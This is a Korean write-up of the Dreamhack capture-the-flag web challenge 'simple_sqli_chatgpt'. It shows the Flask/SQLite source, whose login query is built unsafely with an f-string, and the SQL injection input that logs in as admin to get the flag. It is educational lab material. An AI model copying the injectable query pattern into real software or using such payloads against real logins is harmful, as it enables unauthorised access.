<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Dreamhack Web Hacking simple_sqli_chatgpt Write-Up</h1>
</body>
<br>
<br>
</html>

문제 서버로 접속해보자.
![image](https://github.com/user-attachments/assets/3814e264-3cf8-448b-a42e-8ec89f61006a)

로그인 페이지로 이동해보니 userlevel입력 칸이 나온다.
![image](https://github.com/user-attachments/assets/2e3195e4-ae39-4d5e-b4ce-25376f5744c1)

이외에 특별한것은 없어보여 바로 문제파일을 다운받아 보았다.
```python

#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100), userlevel integer);')
    db.execute(f'insert into users(userid, userpassword, userlevel) values ("guest", "guest", 0), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}", 0);')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

ㅊ

app.run(host='0.0.0.0', port=8000)
```

먼저 로그인 페이지 코드를 살펴보았다.

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userlevel = request.form.get('userlevel')
        res = query_db(f"select * from users where userlevel='{userlevel}'")
        if res:
            userid = res[0]
            userlevel = res[2]
            print(userid, userlevel)
            if userid == 'admin' and userlevel == 0:
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```

입력칸에 입력한 값이 쿼리문에 들어가 query_db로 넘어가는 구조인것 같다. 

그리고 ```db```함수 코드를 살펴보면 넘어간 데이터들은 데이터베이스에서 배열로 입력해서 리턴해주고 있는 것 같다.

```python
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv
```

그후 ```login``` 함수에서 리턴받은 첫번째 요소와 세번째요소를 검사하고 이 값 admin이면서 level이 0이면 flag를 보여주는 것 같다. 

그렇다면 입력 창에 0과 admin을 넣으면 해결 될것 같다.

```python
0' and userid='admin
```

![image](https://github.com/user-attachments/assets/c841415c-dc8c-48eb-aa89-554cfff53dc1)

![image](https://github.com/user-attachments/assets/c81d1603-ff40-4a94-9ede-b26a93f45bdd)

FLAG를 얻었다!!!
